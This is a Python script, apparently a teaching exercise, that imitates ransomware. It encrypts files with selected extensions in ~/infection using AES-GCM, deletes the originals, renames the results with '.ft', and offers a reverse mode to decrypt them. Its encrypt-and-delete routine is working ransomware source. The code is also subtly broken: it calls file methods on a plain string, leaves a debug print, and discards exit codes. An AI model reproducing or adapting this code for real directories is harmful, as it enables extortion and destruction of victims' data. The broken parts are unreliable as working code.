#!/usr/bin/env python3

import argparse
import base64
import os
import sys
from pathlib import Path

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


PROGRAM_NAME = "stockholm"
VERSION = "1.0.42"

INFECTION_DIR = Path.home() / "infection"
EXT_FILE = "wannacry_extensions.txt"

SALT_SIZE = 16 #each devired password is unique
NONCE_SIZE = 12 #each encryption operation is unique

def error_exit(message: str, silent: bool = False, code: int = 1) -> None:
    if not silent:
        print(message, file=sys.stderr)
    sys.exit(code)

def normalize_extension(line: str) -> str | None:
    ext = line.strip().lower()
    if not ext or ext.startswith("#"):
        return None
    if not ext.startswith("."):
        ext = "." + ext
    return ext

def load_allowed_extensions() -> set[str]:
    if not INFECTION_DIR.exists() or not INFECTION_DIR.is_dir():
        raise FileNotFoundError(f"Required directory not found: {INFECTION_DIR}")

    if not EXT_FILE.exists() or not EXT_FILE.is_file():
        raise FileNotFoundError(f"Required file not found: {EXT_FILE}")

    allowed: set[str] = set()
    with EXT_FILE.open("r", encoding="utf-8") as f:
        for line in f:
            ext = normalize_extension(line)
            if ext:
                allowed.add(ext)

    if not allowed:
        raise ValueError(f"No valid extensions found in {EXT_FILE}")

    return allowed

def create_aes_key(key: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=200_000,
    )
    return kdf.derive(key.encode("utf-8"))

def encrypt_bytes(data: bytes, key: str) -> bytes:
    salt = os.urandom(SALT_SIZE)
    nonce = os.urandom(NONCE_SIZE)
    aes_key = create_aes_key(key, salt)
    aesgcm = AESGCM(aes_key)
    ciphertext = aesgcm.encrypt(nonce, data, None)
    return salt + nonce + ciphertext


def decrypt_bytes(data: bytes, key: str) -> bytes:
    minimum = SALT_SIZE + NONCE_SIZE
    if len(data) < minimum:
        raise ValueError("Encrypted file is too short or invalid.")

    offset = 0
    salt = data[offset : offset + SALT_SIZE]
    offset += SALT_SIZE
    nonce = data[offset : offset + NONCE_SIZE]
    offset += NONCE_SIZE
    ciphertext = data[offset:]

    aes_key = create_aes_key(key, salt)
    aesgcm = AESGCM(aes_key)
    return aesgcm.decrypt(nonce, ciphertext, None)


def check_filename(path: Path, allowed_extensions: set[str]) -> bool:
    if not path.is_file() or path.suffix == ".ft":
        return False
    return path.suffix.lower() in allowed_extensions

def encrypt_file(path: Path, key: str, silent: bool) -> bool:
    target = path.with_name(path.name + ".ft")

    try:
        data = path.read_bytes()
        encrypted = encrypt_bytes(data, key)
        target.write_bytes(encrypted)
        path.unlink()

        if not silent:
            print(f"Encrypted: {path.name} -> {target.name}")
        return True

    except OSError as exc:
        if not silent:
            print(f"Error encrypting {path.name}: {exc}", file=sys.stderr)
        return False

def decrypt_file(path: Path, key: str, silent: bool) -> bool:
    original_name = path.name[:-3]  # remove ".ft"
    if not original_name:
        if not silent:
            print(f"Error decrypting {path.name}: invalid target filename.", file=sys.stderr)
        return False

    target = path.with_name(original_name)

    try:
        data = path.read_bytes()
        decrypted = decrypt_bytes(data, key)

        target.write_bytes(decrypted)
        path.unlink()

        if not silent:
            print(f"Decrypted: {path.name} -> {target.name}")
        return True
    except Exception as exc:
        if not silent:
            print(f"Error decrypting {path.name}: {exc}", file=sys.stderr)
        return False


def encrypt_files(key: str, silent: bool) -> int:
    allowed_extensions = load_allowed_extensions()
    files = sorted(INFECTION_DIR.iterdir())

    found = False
    failures = 0

    for path in files:
        if check_filename(path, allowed_extensions):
            found = True
            if not encrypt_file(path, key, silent):
                failures += 1

    if not found:
        if not silent:
            print("No matching files found to encrypt.")

    return 1 if failures else 0


def decrypt_files(key: str, silent: bool) -> int:
    files = sorted(INFECTION_DIR.iterdir())

    found = False
    failures = 0

    for path in files:
        if path.is_file() and path.suffix == ".ft":
            found = True
            if not decrypt_file(path, key, silent):
                failures += 1

    if not found:
        if not silent:
            print("No .ft files found to decrypt.")

    return 1 if failures else 0


def check_key(key: str) -> None:
    if len(key) < 16:
        raise ValueError(f"Key must be at least 16 characters long.")


def parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog=PROGRAM_NAME, description="Encrypt or restore files in ~/infection.")

    parser.add_argument("-v", "--version", action="version", version=f"{PROGRAM_NAME} {VERSION}")
    parser.add_argument("-s", "--silent", action="store_true", help="Do not display processed files.")
    parser.add_argument("-r", "--reverse", metavar="KEY", help="Reverse the main action using the given key.")
    parser.add_argument("key", nargs="?", help="Provide an encryption key (min. size: 16).")
    return parser


def main() -> int:
    args = parser().parse_args()

    print(Path.home())
    try:
        if args.reverse is not None and args.key is not None:
            raise ValueError("Only one key allowed.")

        if args.reverse is None and args.key is None:
            raise ValueError("You must provide a key, or use --reverse KEY.")

        if args.reverse is not None:
            # check_key(args.reverse) #?????
            return decrypt_files(args.reverse, args.silent)

        check_key(args.key)
        return encrypt_files(args.key, args.silent)

    except FileNotFoundError as exc:
        error_exit(f"Error: {exc}", args.silent, 1)
    except ValueError as exc:
        error_exit(f"Error: {exc}", args.silent, 1)
    except KeyboardInterrupt:
        error_exit("Ctrl-C SIGINT.", args.silent, 130)
    except Exception as exc:
        error_exit(f"Unexpected error: {exc}", args.silent, 1)

if __name__ == "__main__":
    main()